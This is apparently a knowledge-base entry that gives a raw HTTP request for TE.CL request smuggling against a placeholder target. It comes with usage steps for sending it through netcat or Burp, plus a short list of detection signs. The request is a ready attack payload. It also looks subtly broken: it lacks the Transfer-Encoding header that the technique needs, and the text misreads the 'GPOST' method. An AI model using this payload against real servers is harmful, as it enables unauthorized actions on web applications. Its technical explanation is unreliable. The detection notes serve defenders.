---
type: code
language: http
verified: true
tags:
  - request-smuggling
  - te-cl
  - payload
platforms:
  - Web
validated: true
---

# te-cl-smuggling-with-injected-post-payload

## Code

```http
POST / HTTP/1.1
Host: $TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0

```

## Description

This HTTP payload performs TE.CL Request Smuggling by embedding a smuggled POST request within a chunked body. The Content-Length: 4 limits front-end reading, but the back-end processes the full hex '5c' (92 bytes) chunk containing a malformed 'GPOST' (likely intended as a smuggled GET/POST hybrid) with parameters, followed by an empty chunk. This can inject unauthorized actions like form submissions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET | Target hostname | domain.example.com |

## Usage

Deliver via raw socket tools like netcat or HTTP proxies like Burp. The smuggled POST submits 'x=1', which could trigger admin actions if targeted at vulnerable endpoints. Test by sending this, then a follow-up request, and check for executed side effects like log entries or state changes.

## Detection

- Logs of chunk sizes exceeding Content-Length values.
- Unusual User-Agent or Accept-Encoding combined with chunked smuggling.
- Backend processing of unexpected POSTs without corresponding front-end logs.
- Response anomalies like injected parameters in cached content.

## Related

- [[procedures/TE-CL-Request-Smuggling]]
